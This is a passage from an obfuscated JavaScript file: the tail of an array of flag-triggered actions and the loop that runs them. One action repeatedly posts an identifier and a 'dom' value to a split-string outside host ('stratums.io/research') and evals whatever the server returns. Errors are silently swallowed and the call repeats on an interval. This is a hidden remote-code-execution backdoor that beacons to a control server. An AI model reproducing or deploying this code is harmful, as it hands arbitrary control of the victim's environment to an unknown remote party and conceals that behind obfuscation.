      }, 0x5f0798 + -0x1 * -0xcf17ea + -0xc04282);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        try {
          axios['post']('https://st' + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, 0x23335 + -0x73453 + 0x61e * 0x191);
    }
  ]
];
for (let e of actions)
  try {
    e[-0x1 * 0xb2d + -0x1283 + 0x1db0]() && setTimeout(e[0x135f + -0x1d74 + -0xa16 * -0x1]);
  } catch (K) {
    warn(K);
  }